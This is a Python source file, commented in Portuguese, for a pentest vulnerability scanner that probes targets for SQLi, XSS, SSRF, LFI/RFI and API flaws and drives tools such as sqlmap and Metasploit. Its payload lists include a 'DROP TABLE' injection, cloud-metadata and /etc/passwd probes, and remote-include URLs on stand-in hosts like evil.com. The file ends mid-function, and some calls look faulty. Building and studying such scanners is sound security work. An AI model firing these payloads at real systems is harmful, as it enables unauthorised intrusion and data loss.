# VulnerabilityAnalyzer.py - Analisador de vulnerabilidades avançado para pentest ético (2025)
# Criado por Hygark (2025)
# Descrição: Script Python para análise de vulnerabilidades em hosts/URLs, com varredura de portas, testes web (SQLi, XSS, CSRF, SSRF, LFI/RFI), detecção de CMS, fingerprinting, subdomínios, APIs REST/GraphQL, WebSockets, cloud misconfigurations, integração com XSStrike/Nikto/Burp Suite/Wfuzz/OWASP ZAP/Metasploit/Nuclei, relatórios JSON/PDF/CSV/HTML, exportação Syslog, e GUI Tkinter com dashboard e relatórios interativos.
# só quero dormir
import socket
import threading
import time
import requests
from bs4 import BeautifulSoup
from scapy.all import sr1, IP, ICMP
from urllib.parse import urljoin
import re
import json
import os
import platform
import smtplib
from email.mime.text import MIMEText
import dns.resolver
import subprocess
import csv
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table
from reportlab.lib.styles import getSampleStyleSheet
import tkinter as tk
from tkinter import ttk, messagebox
from queue import Queue
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import msfrpc
import websocket
import logging.handlers
import asyncio
from tkinterweb.htmlwidgets import HtmlFrame

# Configurações personalizáveis
Settings = {
    'Targets': ['http://testphp.vulnweb.com', '127.0.0.1'],  # Lista de alvos
    'PortRange': (1, 1000),  # Intervalo de portas
    'Timeout': 0.5,  # Timeout por porta
    'Threads': 200,  # Número de threads
    'LogFile': 'logs/vulnerability_analyzer.log',  # Arquivo de log
    'LogWebhook': '',  # URL de webhook
    'SmtpServer': 'smtp.gmail.com',  # Servidor SMTP
    'SmtpPort': 587,  # Porta SMTP
    'SmtpUser': '',  # Usuário SMTP
    'SmtpPass': '',  # Senha SMTP
    'SmtpTo': '',  # Destinatário do email
    'SyslogServer': '',  # Servidor Syslog
    'SyslogPort': 514,  # Porta Syslog
    'ReportDir': 'reports/',  # Diretório para relatórios
    'CheckSQLi': True,  # Testar SQL Injection
    'CheckXSS': True,  # Testar XSS
    'CheckCSRF': True,  # Testar CSRF
    'CheckSSRF': True,  # Testar SSRF
    'CheckLFI': True,  # Testar LFI
    'CheckRFI': True,  # Testar RFI
    'CheckHeaders': True,  # Verificar cabeçalhos
    'CheckCMS': True,  # Detectar CMS
    'CheckSubdomains': True,  # Varredura de subdomínios
    'CheckXSStrike': True,  # Integração com XSStrike
    'CheckNikto': True,  # Integração com Nikto
    'CheckBurp': True,  # Integração com Burp Suite
    'CheckAPI': True,  # Varredura de APIs
    'CheckAdvancedAPI': True,  # Varredura avançada de APIs
    'CheckGraphQL': True,  # Varredura de GraphQL
    'CheckWebSocket': True,  # Varredura de WebSockets
    'CheckCloud': True,  # Verificar misconfigurations em cloud
    'CheckWfuzz': True,  # Integração com Wfuzz
    'CheckZAP': True,  # Integração com OWASP ZAP
    'CheckMetasploit': True,  # Integração com Metasploit
    'CheckNuclei': True,  # Integração com Nuclei
    'FingerprintOS': True,  # Fingerprinting de SO
    'ExportJSON': True,  # Exportar em JSON
    'ExportPDF': True,  # Exportar em PDF
    'ExportCSV': True,  # Exportar em CSV
    'ExportHTML': True,  # Exportar em HTML
    'ExportSyslog': True,  # Exportar para Syslog
    'XSStrikePath': './XSStrike/xsstrike.py',  # Caminho para XSStrike
    'NiktoPath': 'nikto',  # Caminho para Nikto
    'WfuzzPath': 'wfuzz',  # Caminho para Wfuzz
    'NucleiPath': 'nuclei',  # Caminho para Nuclei
    'WordlistPath': './wordlists/common.txt',  # Caminho para wordlist
    'ZAPApiUrl': 'http://localhost:8080',  # URL da API do OWASP ZAP
    'ZAPApiKey': '',  # Chave da API do OWASP ZAP
    'BurpApiUrl': 'http://localhost:1337/v0.1',  # URL da API do Burp Suite
    'BurpApiKey': '',  # Chave da API do Burp Suite
    'MetasploitHost': 'localhost',  # Host do Metasploit RPC
    'MetasploitPort': 55552,  # Porta do Metasploit RPC
    'MetasploitUser': 'msf',  # Usuário do Metasploit
    'MetasploitPass': '',  # Senha do Metasploit
    'SubdomainList': ['www', 'mail', 'ftp', 'admin', 'test', 'api'],  # Lista de subdomínios
}

# Configuração de logging Syslog
syslog_handler = None
if Settings['SyslogServer']:
    syslog_handler = logging.handlers.SysLogHandler(address=(Settings['SyslogServer'], Settings['SyslogPort']))
    syslog_handler.setLevel(logging.INFO)
    formatter = logging.Formatter('%(name)s: %(levelname)s %(message)s')
    syslog_handler.setFormatter(formatter)
    logging.getLogger('').addHandler(syslog_handler)

# Estado do script
ScriptState = {
    'IsRunning': False,
    'Vulnerabilities': [],
    'TotalScans': 0,
    'TotalVulnsFound': 0,
    'Results': {},
    'Subdomains': [],
}

# Função para enviar logs
def log_message(level, message):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{level}] [{timestamp}] {message}"
    print(log_entry)
    
    # Log em arquivo
    os.makedirs(os.path.dirname(Settings['LogFile']), exist_ok=True)
    with open(Settings['LogFile'], 'a') as f:
        f.write(log_entry + '\n')
    
    # Log via webhook
    if Settings['LogWebhook']:
        try:
            requests.post(Settings['LogWebhook'], json={'content': log_entry}, timeout=5)
        except Exception as e:
            print(f"[ERRO] Falha ao enviar log para webhook: {e}")
    
    # Log via email
    if Settings['SmtpServer'] and Settings['SmtpUser'] and Settings['SmtpTo']:
        try:
            msg = MIMEText(log_entry)
            msg['Subject'] = f"VulnerabilityAnalyzer Alerta - {level}"
            msg['From'] = Settings['SmtpUser']
            msg['To'] = Settings['SmtpTo']
            with smtplib.SMTP(Settings['SmtpServer'], Settings['SmtpPort']) as server:
                server.starttls()
                server.login(Settings['SmtpUser'], Settings['SmtpPass'])
                server.send_message(msg)
            print(f"[INFO] Alerta enviado por email para {Settings['SmtpTo']}")
        except Exception as e:
            print(f"[ERRO] Falha ao enviar email: {e}")
    
    # Log via Syslog
    if syslog_handler:
        logging.getLogger('').log(
            {'INFO': logging.INFO, 'AVISO': logging.WARNING, 'CRÍTICO': logging.CRITICAL, 'ERRO': logging.ERROR}.get(level, logging.INFO),
            log_entry
        )

# Função para varredura de portas
def scan_port(host, port, protocol, result_queue):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == 'TCP' else socket.SOCK_DGRAM)
        sock.settimeout(Settings['Timeout'])
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            result_queue.put((port, protocol, 'Aberta'))
            log_message('INFO', f'Porta {port}/{protocol} aberta em {host}')
        ScriptState['TotalScans'] += 1
    except Exception as e:
        log_message('ERRO', f'Erro ao verificar porta {port} em {host}: {e}')

# Função para varrer portas de um alvo
def scan_ports(host, port_range, protocol, callback):
    result_queue = Queue()
    threads = []
    for port in range(port_range[0], port_range[1] + 1):
        t = threading.Thread(target=scan_port, args=(host, port, protocol, result_queue))
        threads.append(t)
        t.start()
        if len(threads) >= Settings['Threads']:
            for t in threads:
                t.join()
            threads = []
    
    for t in threads:
        t.join()
    
    while not result_queue.empty():
        port, proto, status = result_queue.get()
        ScriptState['Results'][host]['ports'].append(f'{port}/{proto}')
    callback(host, ScriptState['Results'][host]['ports'])

# Função para fingerprinting de SO
def fingerprint_os(host):
    try:
        packet = IP(dst=host)/ICMP()
        response = sr1(packet, timeout=2, verbose=0, inter=0.1)
        if response:
            ttl = response[IP].ttl
            os_guess = 'Desconhecido'
            if ttl <= 64:
                os_guess = 'Linux/Unix'
            elif ttl <= 128:
                os_guess = 'Windows'
            elif ttl <= 255:
                os_guess = 'Solaris/Cisco'
            ScriptState['Vulnerabilities'].append(('Fingerprinting SO', f'SO estimado: {os_guess} (TTL: {ttl})', host))
            log_message('INFO', f'SO estimado em {host}: {os_guess} (TTL: {ttl})')
            return os_guess
        return 'Desconhecido'
    except Exception as e:
        log_message('ERRO', f'Erro ao realizar fingerprinting em {host}: {e}')
        return 'Desconhecido'

# Função para verificar cabeçalhos de segurança
def check_security_headers(url):
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        issues = []
        
        checks = {
            'Content-Security-Policy': lambda h: 'Content-Security-Policy' not in h,
            'X-Content-Type-Options': lambda h: 'X-Content-Type-Options' not in h or h['X-Content-Type-Options'] != 'nosniff',
            'X-Frame-Options': lambda h: 'X-Frame-Options' not in h or h['X-Frame-Options'] not in ['DENY', 'SAMEORIGIN'],
            'Strict-Transport-Security': lambda h: 'Strict-Transport-Security' not in h
        }
        
        for header, check in checks.items():
            if check(headers):
                issues.append(f'Falta ou inválido {header}')
        
        if issues:
            ScriptState['TotalVulnsFound'] += len(issues)
            for issue in issues:
                ScriptState['Vulnerabilities'].append(('Cabeçalhos', issue, url))
                log_message('AVISO', f'Vulnerabilidade de cabeçalho: {issue} em {url}')
        else:
            log_message('INFO', f'Nenhum problema de cabeçalho em {url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao verificar cabeçalhos em {url}: {e}')

# Função para detectar CMS
def detect_cms(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        cms_indicators = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Joomla': ['com_content', 'joomla.css'],
            'Drupal': ['drupal.js', 'sites/default']
        }
        
        for cms, indicators in cms_indicators.items():
            for indicator in indicators:
                if indicator in response.text.lower():
                    ScriptState['Vulnerabilities'].append(('Detecção de CMS', f'CMS detectado: {cms}', url))
                    log_message('INFO', f'CMS detectado: {cms} em {url}')
                    return cms
        log_message('INFO', f'Nenhum CMS detectado em {url}')
        return 'Desconhecido'
    except Exception as e:
        log_message('ERRO', f'Erro ao detectar CMS em {url}: {e}')
        return 'Desconhecido'

# Função para testar SQL Injection
def test_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "1; DROP TABLE users --",
        "' UNION SELECT NULL, NULL --",
        "1' AND 1=1 --",
        "' OR 'a'='a",
        "' OR 1=1--",
        "1' AND SLEEP(5)--"
    ]
    try:
        for payload in payloads:
            test_url = urljoin(url, f"?id={payload}")
            start_time = time.time()
            response = requests.get(test_url, timeout=7)
            elapsed = time.time() - start_time
            if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax error', 'database']) or (elapsed > 5 and 'SLEEP' in payload):
                ScriptState['Vulnerabilities'].append(('SQL Injection', f'Potencial SQLi com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Potencial SQL Injection em {test_url}')
        
        try:
            result = subprocess.run(['sqlmap', '-u', url, '--batch', '--level=1'], capture_output=True, text=True, timeout=60)
            if 'vulnerable' in result.stdout.lower():
                ScriptState['Vulnerabilities'].append(('SQL Injection', 'SQLi confirmado via sqlmap', url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'SQL Injection confirmado via sqlmap em {url}')
        except Exception as e:
            log_message('AVISO', f'Sqlmap não disponível ou erro: {e}')
    except Exception as e:
        log_message('ERRO', f'Erro ao testar SQLi em {url}: {e}')

# Função para testar XSS
def test_xss(url):
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '" onmouseover="alert(\'XSS\')"',
        '<svg onload=alert("XSS")>',
        '<iframe src=javascript:alert("XSS")>',
        '<script src="http://malicious.com/xss.js"></script>',
        '<input type="text" value="" onfocus="alert(\'XSS\')">'
    ]
    try:
        for payload in payloads:
            test_url = urljoin(url, f"?q={payload}")
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                ScriptState['Vulnerabilities'].append(('XSS', f'Potencial XSS com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Potencial XSS em {test_url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao testar XSS em {url}: {e}')

# Função para testar CSRF
def test_csrf(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            if not form.find('input', {'name': re.compile(r'csrf|token', re.I)}):
                ScriptState['Vulnerabilities'].append(('CSRF', 'Formulário sem token CSRF', urljoin(url, form.get('action', ''))))
                ScriptState['TotalVulnsFound'] += 1
                log_message('AVISO', f'Formulário sem token CSRF em {url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao testar CSRF em {url}: {e}')

# Função para testar SSRF
def test_ssrf(url):
    payloads = [
        'http://169.254.169.254/latest/meta-data/',
        'http://127.0.0.1:8080',
        'file:///etc/passwd',
        'http://localhost/admin'
    ]
    try:
        for payload in payloads:
            test_url = urljoin(url, f"?url={payload}")
            response = requests.get(test_url, timeout=5)
            if any(sign in response.text.lower() for sign in ['instance-id', 'metadata', 'root:', 'admin']):
                ScriptState['Vulnerabilities'].append(('SSRF', f'Potencial SSRF com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Potencial SSRF em {test_url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao testar SSRF em {url}: {e}')

# Função para testar LFI/RFI
def test_lfi_rfi(url):
    lfi_payloads = [
        '../../../../etc/passwd',
        '/etc/passwd',
        '../../windows/win.ini',
        '/proc/self/environ',
        '../config.php',
        '../../.htaccess'
    ]
    rfi_payloads = [
        'http://malicious.com/shell.txt',
        'https://evil.com/malware.php',
        'http://attacker.com/backdoor.php'
    ]
    try:
        for payload in lfi_payloads:
            test_url = urljoin(url, f"?file={payload}")
            response = requests.get(test_url, timeout=5)
            if any(sign in response.text.lower() for sign in ['root:', '[extensions]', 'user=', '<?php', 'AuthType']):
                ScriptState['Vulnerabilities'].append(('LFI', f'Potencial LFI com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Potencial LFI em {test_url}')
        
        for payload in rfi_payloads:
            test_url = urljoin(url, f"?file={payload}")
            response = requests.get(test_url, timeout=5)
            if any(sign in response.text.lower() for sign in ['<?php', 'shell', 'backdoor']):
                ScriptState['Vulnerabilities'].append(('RFI', f'Potencial RFI com payload {payload}', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Potencial RFI em {test_url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao testar LFI/RFI em {url}: {e}')

# Função para testar WebSockets
async def test_websocket(url):
    ws_url = url.replace('http://', 'ws://').replace('https://', 'wss://')
    payloads = [
        '<script>alert("XSS")</script>',
        '{"id": "1 OR 1=1"}',
        'eval("malicious code")'
    ]
    try:
        async with websocket.WebSocket() as ws:
            await ws.connect(ws_url)
            for payload in payloads:
                await ws.send(payload)
                response = await ws.recv()
                if any(sign in response.lower() for sign in ['alert', 'sql', 'eval']):
                    ScriptState['Vulnerabilities'].append(('WebSocket', f'Potencial vulnerabilidade com payload {payload}', ws_url))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('CRÍTICO', f'Potencial vulnerabilidade WebSocket em {ws_url}')
                # Testar autenticação fraca
                await ws.send('{"auth": "invalid"}')
                response = await ws.recv()
                if 'success' in response.lower():
                    ScriptState['Vulnerabilities'].append(('WebSocket', 'Autenticação fraca detectada', ws_url))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('AVISO', f'Autenticação fraca em WebSocket {ws_url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao testar WebSocket em {ws_url}: {e}')

# Função para verificar misconfigurations em cloud
def check_cloud_misconfigurations(url):
    cloud_endpoints = [
        f"{url}/s3.amazonaws.com",
        f"{url}/blob.core.windows.net",
        f"{url}/storage.googleapis.com"
    ]
    try:
        for endpoint in cloud_endpoints:
            response = requests.get(endpoint, timeout=5)
            if response.status_code == 200 and any(sign in response.text.lower() for sign in ['bucket', 'blob', 'storage']):
                ScriptState['Vulnerabilities'].append(('Misconfiguração Cloud', f'Possível bucket público em {endpoint}', url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Possível bucket público em {endpoint}')
    except Exception as e:
        log_message('ERRO', f'Erro ao verificar cloud em {url}: {e}')

# Função para integração com XSStrike
def test_xsstrike(url):
    if not os.path.exists(Settings['XSStrikePath']):
        log_message('ERRO', f'XSStrike não encontrado em {Settings["XSStrikePath"]}. Instale-o.')
        return
    try:
        result = subprocess.run(
            ['python3', Settings['XSStrikePath'], '-u', url, '--crawl', '--level=2'],
            capture_output=True, text=True, timeout=120
        )
        if 'vulnerable' in result.stdout.lower():
            ScriptState['Vulnerabilities'].append(('XSS', f'XSS confirmado via XSStrike', url))
            ScriptState['TotalVulnsFound'] += 1
            log_message('CRÍTICO', f'XSS confirmado via XSStrike em {url}: {result.stdout[:200]}...')
        else:
            log_message('INFO', f'Nenhum XSS encontrado por XSStrike em {url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao executar XSStrike: {e}')

# Função para integração com Nikto
def test_nikto(url):
    try:
        report_path = os.path.join(Settings['ReportDir'], f'nikto_{int(time.time())}.json')
        result = subprocess.run(
            [Settings['NiktoPath'], '-h', url, '-output', report_path, '-Format', 'json'],
            capture_output=True, text=True, timeout=300
        )
        if os.path.exists(report_path):
            with open(report_path, 'r') as f:
                nikto_data = json.load(f)
            for vuln in nikto_data.get('vulnerabilities', []):
                ScriptState['Vulnerabilities'].append(('Nikto', vuln.get('msg', 'Desconhecido'), url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Vulnerabilidade Nikto em {url}: {vuln.get("msg", "Desconhecido")}')
        log_message('INFO', f'Nikto varredura concluída em {url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao executar Nikto: {e}')

# Função para integração com Burp Suite
def test_burp(url):
    if not Settings['BurpApiKey']:
        log_message('ERRO', 'Chave da API do Burp Suite não configurada.')
        return
    try:
        headers = {'Authorization': f'Bearer {Settings["BurpApiKey"]}'}
        response = requests.post(
            f"{Settings['BurpApiUrl']}/scan",
            headers=headers,
            json={'urls': [url]},
            timeout=10
        )
        if response.status_code == 201:
            scan_id = response.json().get('scan_id')
            log_message('INFO', f'Varredura Burp iniciada para {url}, ID: {scan_id}')
            for _ in range(60):
                status_response = requests.get(
                    f"{Settings['BurpApiUrl']}/scan/{scan_id}",
                    headers=headers,
                    timeout=5
                )
                if status_response.json().get('status') == 'completed':
                    for issue in status_response.json().get('issues', []):
                        ScriptState['Vulnerabilities'].append(('Burp Suite', issue.get('type', 'Desconhecido'), url))
                        ScriptState['TotalVulnsFound'] += 1
                        log_message('CRÍTICO', f'Vulnerabilidade Burp em {url}: {issue.get("type", "Desconhecido")}')
                    break
                time.sleep(10)
        else:
            log_message('ERRO', f'Erro ao iniciar varredura Burp: {response.text}')
    except Exception as e:
        log_message('ERRO', f'Erro ao executar Burp Suite: {e}')

# Função para integração com Wfuzz
def test_wfuzz(url):
    if not os.path.exists(Settings['WordlistPath']):
        log_message('ERRO', f'Wordlist não encontrada em {Settings["WordlistPath"]}.')
        return
    try:
        report_path = os.path.join(Settings['ReportDir'], f'wfuzz_{int(time.time())}.json')
        result = subprocess.run(
            [Settings['WfuzzPath'], '-u', url, '-w', Settings['WordlistPath'], '--hc', '404', '-o', 'json', '--oF', report_path],
            capture_output=True, text=True, timeout=300
        )
        if os.path.exists(report_path):
            with open(report_path, 'r') as f:
                wfuzz_data = json.load(f)
            for entry in wfuzz_data:
                if entry.get('code') in [200, 301, 302]:
                    ScriptState['Vulnerabilities'].append(('Wfuzz', f'Endpoint encontrado: {entry.get("url")}', url))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('INFO', f'Wfuzz encontrou endpoint em {url}: {entry.get("url")}')
        log_message('INFO', f'Wfuzz varredura concluída em {url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao executar Wfuzz: {e}')

# Função para integração com OWASP ZAP
def test_zap(url):
    if not Settings['ZAPApiKey']:
        log_message('ERRO', 'Chave da API do OWASP ZAP não configurada.')
        return
    try:
        params = {'apikey': Settings['ZAPApiKey']}
        response = requests.get(
            f"{Settings['ZAPApiUrl']}/JSON/ascan/action/scan/",
            params={**params, 'url': url, 'recurse': '1'},
            timeout=10
        )
        if response.status_code == 200:
            scan_id = response.json().get('scan')
            log_message('INFO', f'Varredura ZAP iniciada para {url}, ID: {scan_id}')
            for _ in range(60):
                status_response = requests.get(
                    f"{Settings['ZAPApiUrl']}/JSON/ascan/view/status/",
                    params={**params, 'scanId': scan_id},
                    timeout=5
                )
                if status_response.json().get('status') == '100':
                    alerts_response = requests.get(
                        f"{Settings['ZAPApiUrl']}/JSON/core/view/alerts/",
                        params={**params, 'baseurl': url},
                        timeout=5
                    )
                    for alert in alerts_response.json().get('alerts', []):
                        ScriptState['Vulnerabilities'].append(('OWASP ZAP', alert.get('alert', 'Desconhecido'), url))
                        ScriptState['TotalVulnsFound'] += 1
                        log_message('CRÍTICO', f'Vulnerabilidade ZAP em {url}: {alert.get("alert", "Desconhecido")}')
                    break
                time.sleep(10)
        else:
            log_message('ERRO', f'Erro ao iniciar varredura ZAP: {response.text}')
    except Exception as e:
        log_message('ERRO', f'Erro ao executar OWASP ZAP: {e}')

# Função para integração com Metasploit
def test_metasploit(host, ports):
    if not Settings['MetasploitPass']:
        log_message('ERRO', 'Credenciais do Metasploit não configuradas.')
        return
    try:
        client = msfrpc.Msfrpc({'host': Settings['MetasploitHost'], 'port': Settings['MetasploitPort']})
        client.login(Settings['MetasploitUser'], Settings['MetasploitPass'])
        log_message('INFO', f'Conectado ao Metasploit RPC em {Settings["MetasploitHost"]}:{Settings["MetasploitPort"]}')
        
        for port in ports:
            port_num = int(port.split('/')[0])
            if port_num == 80:
                module = 'auxiliary/scanner/http/http_version'
            elif port_num == 445:
                module = 'auxiliary/scanner/smb/smb_version'
            else:
                continue
            
            console = client.call('console.create', [])
            console_id = console['id']
            client.call('console.write', [console_id, f'use {module}\nset RHOSTS {host}\nrun\n'])
            time.sleep(10)
            result = client.call('console.read', [console_id])
            if 'vulnerable' in result['data'].lower() or 'open' in result['data'].lower():
                ScriptState['Vulnerabilities'].append(('Metasploit', f'Potencial vulnerabilidade em {host}:{port} ({module})', host))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Metasploit detectou vulnerabilidade em {host}:{port} ({module})')
            client.call('console.destroy', [console_id])
        log_message('INFO', f'Metasploit varredura concluída em {host}')
    except Exception as e:
        log_message('ERRO', f'Erro ao executar Metasploit: {e}')

# Função para integração com Nuclei
def test_nuclei(url):
    if not os.path.exists(Settings['NucleiPath']):
        log_message('ERRO', f'Nuclei não encontrado em {Settings["NucleiPath"]}. Instale-o.')
        return
    try:
        report_path = os.path.join(Settings['ReportDir'], f'nuclei_{int(time.time())}.json')
        result = subprocess.run(
            [Settings['NucleiPath'], '-u', url, '-json', '-o', report_path],
            capture_output=True, text=True, timeout=300
        )
        if os.path.exists(report_path):
            with open(report_path, 'r') as f:
                for line in f:
                    try:
                        vuln = json.loads(line.strip())
                        ScriptState['Vulnerabilities'].append(('Nuclei', vuln.get('info', {}).get('name', 'Desconhecido'), url))
                        ScriptState['TotalVulnsFound'] += 1
                        log_message('CRÍTICO', f'Vulnerabilidade Nuclei em {url}: {vuln.get("info", {}).get("name", "Desconhecido")}')
                    except json.JSONDecodeError:
                        continue
        log_message('INFO', f'Nuclei varredura concluída em {url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao executar Nuclei: {e}')

# Função para varredura de APIs
def test_api(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        endpoints = []
        for link in soup.find_all(['a', 'form', 'link'], href=True):
            href = urljoin(url, link['href'])
            if '/api/' in href.lower():
                endpoints.append(href)
        for script in soup.find_all('script', src=True):
            src = urljoin(url, script['src'])
            if '/api/' in src.lower():
                endpoints.append(src)
        
        for endpoint in endpoints:
            response = requests.get(endpoint, timeout=5)
            if response.status_code == 200 and 'authentication' not in response.text.lower():
                ScriptState['Vulnerabilities'].append(('API', 'Possível autenticação fraca', endpoint))
                ScriptState['TotalVulnsFound'] += 1
                log_message('AVISO', f'Possível autenticação fraca em {endpoint}')
            
            test_url = urljoin(endpoint, '?id=1%27%20OR%20%271%27=%271')
            response = requests.get(test_url, timeout=5)
            if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax']):
                ScriptState['Vulnerabilities'].append(('API', 'Potencial SQLi em endpoint', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Potencial SQLi em endpoint {test_url}')
            
            test_url = urljoin(endpoint, '?q=<script>alert("XSS")</script>')
            response = requests.get(test_url, timeout=5)
            if '<script>alert("XSS")</script>' in response.text:
                ScriptState['Vulnerabilities'].append(('API', 'Potencial XSS em endpoint', test_url))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Potencial XSS em endpoint {test_url}')
    except Exception as e:
        log_message('ERRO', f'Erro ao testar API em {url}: {e}')

# Função para testes avançados de API
def test_advanced_api(url):
    try:
        endpoints = []
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all(['a', 'form', 'link'], href=True):
            href = urljoin(url, link['href'])
            if '/api/' in href.lower():
                endpoints.append(href)
        
        for endpoint in endpoints:
            headers = {'Authorization': 'Bearer invalid.jwt.token'}
            response = requests.get(endpoint, headers=headers, timeout=5)
            if response.status_code == 200:
                ScriptState['Vulnerabilities'].append(('API Avançada', 'Bypass de autenticação JWT', endpoint))
                ScriptState['TotalVulnsFound'] += 1
                log_message('CRÍTICO', f'Bypass de autenticação JWT em {endpoint}')
            
            for i in range(10):
                response = requests.get(endpoint, timeout=5)
                if response.status_code == 429:
                    ScriptState['Vulnerabilities'].append(('API Avançada', 'Rate limiting detectado', endpoint))
                    log_message('INFO', f'Rate limiting detectado em {endpoint}')
                    break
                elif response.status_code == 200 and i == 9:
                    ScriptState['Vulnerabilities'].append(('API Avançada', 'Ausência de rate limiting', endpoint))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('AVISO', f'Ausência de rate limiting em {endpoint}')
            
            payloads = [
                '{"id": "1 OR 1=1"}',
                '<xml><id>1 OR 1=1</id></xml>'
            ]
            for payload in payloads:
                response = requests.post(endpoint, data=payload, headers={'Content-Type': 'application/json'}, timeout=5)
                if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'error']):
                    ScriptState['Vulnerabilities'].append(('API Avançada', f'Potencial injeção de dados ({payload[:20]}...)', endpoint))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('CRÍTICO', f'Potencial injeção de dados em {endpoint}')
    except Exception as e:
        log_message('ERRO', f'Erro ao testar API avançada em {url}: {e}')

# Função para testes de GraphQL
def test_graphql(url):
    try:
        endpoints = []
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all(['a', 'form', 'link'], href=True):
            href = urljoin(url, link['href'])
            if 'graphql' in href.lower():
                endpoints.append(href)
        
        for endpoint in endpoints:
            query = {'query': 'query { __schema { types { name } } }'}
            response = requests.post(endpoint, json=query, timeout=5)
            if response.status_code == 200 and '__schema' in response.text:
                ScriptState['Vulnerabilities'].append(('GraphQL', 'Introspecção GraphQL habilitada', endpoint))
                ScriptState['TotalVulnsFound'] += 1
                log_message('AVISO', f'Introspecção GraphQL habilitada em {endpoint}')
            
            payloads = [
                'query { users { id union(select null, null, null) } }',
                'query { test(id: "1 OR 1=1") { id } }'
            ]
            for payload in payloads:
                response = requests.post(endpoint, json={'query': payload}, timeout=5)
                if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'error']):
                    ScriptState['Vulnerabilities'].append(('GraphQL', f'Potencial injeção GraphQL ({payload[:20]}...)', endpoint))
                    ScriptState['TotalVulnsFound'] += 1
                    log_message('CRÍTICO', f'Potencial injeção GraphQL em {endpoint}')
    except Exception as e:
        log_message('ERRO', f'Erro ao testar GraphQL em {url}: {e}')

# Função para varredura de subdomínios
def scan_subdomains(target):
    domain = target.split('://')[-1].split('/')[0]
    for subdomain in Settings['SubdomainList']:
        try:
            sub = f"{subdomain}.{domain}"
            answers = dns.resolver.resolve(sub, 'A')
            for ip in answers:
                sub_url = f"http://{sub}"
                ScriptState['Subdomains'].append(f"{sub}: {ip}")
                log_message('INFO', f'Subdomínio encontrado: {sub} ({ip})')
                ScriptState['Results'][sub_url] = {'ports': [], 'vulns': []}
                if Settings['CheckHeaders']:
                    check_security_headers(sub_url)
                if Settings['CheckSQLi']:
                    test_sql_injection(sub_url)
                if Settings['CheckXSS']:
                    test_xss(sub_url)
                if Settings['CheckCSRF']:
                    test_csrf(sub_url)
                if Settings['CheckSSRF']:
                    test_ssrf(sub_url)
                if Settings['CheckLFI'] or Settings['CheckRFI']:
                    test_lfi_rfi(sub_url)
                if Settings['CheckXSStrike']:
                    test_xsstrike(sub_url)
                if Settings['CheckNikto']:
                    test_nikto(sub_url)
                if Settings['CheckBurp']:
                    test_burp(sub_url)
                if Settings['CheckAPI']:
                    test_api(sub_url)
                if Settings['CheckAdvancedAPI']:
                    test_advanced_api(sub_url)
                if Settings['CheckGraphQL']:
                    test_graphql(sub_url)
                if Settings['CheckWebSocket']:
                    asyncio.run(test_websocket(sub_url))
                if Settings['CheckCloud']:
                    check_cloud_misconfigurations(sub_url)
                if Settings['CheckWfuzz']:
                    test_wfuzz(sub_url)
                if Settings['CheckZAP']:
                    test_zap(sub_url)
                if Settings['CheckNuclei']:
                    test_nuclei(sub_url)
        except dns.resolver.NXDOMAIN:
            continue
        except Exception as e:
            log_message('ERRO', f'Erro ao escanear subdomínio {sub}: {e}')

# Função para varrer alvos
def scan_target(target):
    ScriptState['Results'][target] = {'ports': [], 'vulns': []}
    
    if target.startswith('http'):
        if Settings['CheckHeaders']:
            check_security_headers(target)
        if Settings['CheckCMS']:
            detect_cms(target)
        if Settings['CheckSQLi']:
            test_sql_injection(target)
        if Settings['CheckXSS']:
            test_xss(target)
        if Settings['CheckCSRF']:
            test_csrf(target)
